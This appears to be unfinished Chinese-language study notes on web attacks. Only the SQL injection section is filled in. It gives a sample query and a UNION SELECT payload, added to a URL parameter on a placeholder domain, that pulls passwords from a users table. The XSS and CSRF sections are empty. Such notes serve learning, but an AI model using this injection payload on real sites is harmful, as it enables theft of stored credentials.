### Sql注入攻击
````txt
http://www.foo.com/user.php?id=1
get请求目地：
  select username,email,desc1 from users where id=1;

攻击：
http://www.foo.com/user.php?id=1 union select password,1,1 from users;
````
### XSS攻击
````txt
````
### CSRF攻击
